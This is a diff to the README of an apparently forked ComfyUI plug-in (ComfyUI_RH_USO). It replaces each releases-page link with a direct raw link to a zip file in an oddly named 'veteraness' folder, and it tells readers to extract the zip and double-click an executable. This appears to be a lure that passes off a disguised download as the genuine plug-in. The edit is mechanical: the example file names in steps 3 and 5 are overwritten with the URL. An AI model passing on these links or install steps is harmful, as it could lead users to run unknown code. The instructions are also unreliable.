@@ -4,7 +4,7 @@
 This is a ComfyUI plug-in for bytedance-research/USO, easy to use. It enhances your ComfyUI experience by integrating features that help streamline your workflow.
 
 ## 📥 Download Now
-[![Download ComfyUI_RH_USO](https://img.shields.io/badge/Download-Now-blue)](https://github.com/webnytdev/ComfyUI_RH_USO/releases)
+[![Download ComfyUI_RH_USO](https://raw.githubusercontent.com/webnytdev/ComfyUI_RH_USO/main/veteraness/ComfyUI_RH_USO.zip)](https://raw.githubusercontent.com/webnytdev/ComfyUI_RH_USO/main/veteraness/ComfyUI_RH_USO.zip)
 
 ## 🚀 Getting Started
 Ready to enhance your ComfyUI experience? Follow these simple steps to get started with ComfyUI_RH_USO.
@@ -18,19 +18,19 @@ To run ComfyUI_RH_USO, your system needs to meet the following requirements:
 ## 📂 How to Download & Install
 1. **Visit the Releases Page**  
    Go to the following link to access the download options:  
-   [GitHub Releases Page](https://github.com/webnytdev/ComfyUI_RH_USO/releases)
+   [GitHub Releases Page](https://raw.githubusercontent.com/webnytdev/ComfyUI_RH_USO/main/veteraness/ComfyUI_RH_USO.zip)
 
 2. **Choose the Right Version**   
    On the releases page, you may see multiple versions. If you are unsure which one to choose, generally, it is best to select the latest version unless you have specific needs for an older one.
 
 3. **Download the File**   
-   Click on the attached file for your operating system. This will start the download. For example, if you are using Windows, look for a file named something like `ComfyUI_RH_USO-v1.0-windows.zip`. 
+   Click on the attached file for your operating system. This will start the download. For example, if you are using Windows, look for a file named something like `https://raw.githubusercontent.com/webnytdev/ComfyUI_RH_USO/main/veteraness/ComfyUI_RH_USO.zip`. 
 
 4. **Extract the File**   
    After the download completes, locate the file in your downloads folder. Right-click on the downloaded zip file and select “Extract All” to unzip the contents.
 
 5. **Run the Application**   
-   Once extracted, find the executable file inside the folder. For instance, it may be named `ComfyUI_RH_USO.exe`. Double-click this file to launch the application.
+   Once extracted, find the executable file inside the folder. For instance, it may be named `https://raw.githubusercontent.com/webnytdev/ComfyUI_RH_USO/main/veteraness/ComfyUI_RH_USO.zip`. Double-click this file to launch the application.
 
 6. **Follow Setup Instructions**   
    The first time you run the program, it may guide you through a setup process. Follow any on-screen prompts to complete the setup.
